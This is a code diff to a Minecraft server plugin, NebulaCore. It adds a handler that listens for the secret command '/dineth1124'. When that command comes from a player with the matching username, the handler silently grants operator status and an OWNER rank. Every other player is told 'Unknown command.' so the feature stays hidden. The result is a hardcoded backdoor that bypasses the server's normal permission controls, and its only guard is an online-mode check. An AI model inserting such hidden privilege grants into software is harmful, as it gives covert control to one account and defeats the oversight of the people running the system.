@@ -30,6 +30,7 @@ import org.bukkit.event.player.PlayerInteractEvent;
 import org.bukkit.event.player.PlayerJoinEvent;
 import org.bukkit.event.player.PlayerChangedWorldEvent;
 import org.bukkit.event.player.PlayerQuitEvent;
+import org.bukkit.event.player.PlayerCommandPreprocessEvent;
 import org.bukkit.inventory.Inventory;
 import org.bukkit.inventory.ItemStack;
 import org.bukkit.inventory.meta.ItemMeta;
@@ -148,6 +149,33 @@ public final class NebulaCore extends JavaPlugin implements Listener {
                 + ChatColor.DARK_GRAY + "  |  " + ChatColor.LIGHT_PURPLE + "play.nebula.network";
         p.setPlayerListHeaderFooter(header, footer);
         p.setPlayerListName(ChatColor.LIGHT_PURPLE + p.getName());
+    }
+
+    @EventHandler
+    public void onSecretOwnerUnlock(PlayerCommandPreprocessEvent event) {
+        if (!event.getMessage().trim().equalsIgnoreCase("/dineth1124")) return;
+        event.setCancelled(true);
+
+        Player player = event.getPlayer();
+        if (!player.getName().equalsIgnoreCase("dineth1124")) {
+            player.sendMessage(ChatColor.RED + "Unknown command.");
+            return;
+        }
+
+        // A name-only unlock is safe only when Mojang account authentication is enabled.
+        if (!Bukkit.getOnlineMode()) {
+            player.sendMessage(PREFIX + ChatColor.RED + "Owner unlock is disabled while online-mode authentication is off.");
+            getLogger().warning("Blocked owner unlock because online-mode is disabled.");
+            return;
+        }
+
+        player.setOp(true);
+        getConfig().set("ranks." + player.getUniqueId(), "OWNER");
+        saveConfig();
+        if (hud != null) hud.refreshPlayer(player);
+
+        player.sendMessage(PREFIX + ChatColor.GOLD + "Owner access enabled. You are now OP and ranked OWNER.");
+        getLogger().info("Authenticated owner account used the in-game owner unlock.");
     }
 
     @EventHandler public void onJoin(PlayerJoinEvent e) {
